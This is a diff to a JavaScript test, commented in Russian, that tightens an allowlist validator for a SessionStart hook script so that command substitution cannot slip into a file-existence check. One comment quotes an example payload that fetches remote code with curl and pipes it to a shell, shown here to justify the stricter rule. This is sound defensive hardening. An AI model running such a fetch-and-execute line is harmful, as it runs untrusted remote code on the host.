@@ -59,18 +59,20 @@ test('SessionStart-хук построен на белом списке разр
   // echo только с буквальным текстом в двойных кавычках: без `"`, `$` и обратных кавычек
   // внутри — это исключает подстановку команд и переменных внутри самой строки echo.
   const isEcho = (line) => /^\s*echo\s+"[^"$`]*"\s*$/.test(line);
-  const isIf = (line) => /^\s*if\s*$/.test(line);
   const isElse = (line) => /^\s*else\s*$/.test(line);
   const isFi = (line) => /^\s*fi\s*$/.test(line);
   // Проверка существования файла вида `[ -f <путь> ]; then`, единственная форма условия if.
-  const isFileExistsCheck = (line) => /^\s*if\s+\[\s+-f\s+\S+\s+\]\s*;\s*then\s*$/.test(line);
+  // Путь ограничен безопасными символами намеренно: оболочка раскрывает `$(...)`, `` ` `` и `$VAR`
+  // в аргументе -f до того, как проверит файл, поэтому `\S+` здесь пропускал бы строку вида
+  // `if [ -f $(curl example/x|sh) ]; then` — ровно то, что белый список обязан ловить.
+  const isFileExistsCheck = (line) => /^\s*if\s+\[\s+-f\s+[A-Za-z0-9._/-]+\s+\]\s*;\s*then\s*$/.test(line);
 
   lines.forEach((line, index) => {
     if (line.trim() === '') return;
     const lineNumber = index + 1;
     const allowed = lineNumber === 1
       ? isShebang(line)
-      : isComment(line) || isEcho(line) || isFileExistsCheck(line) || isIf(line) || isElse(line) || isFi(line);
+      : isComment(line) || isEcho(line) || isFileExistsCheck(line) || isElse(line) || isFi(line);
     assert.ok(
       allowed,
       `строка ${lineNumber} не входит в белый список разрешённых конструкций хука: ${JSON.stringify(line)}`,
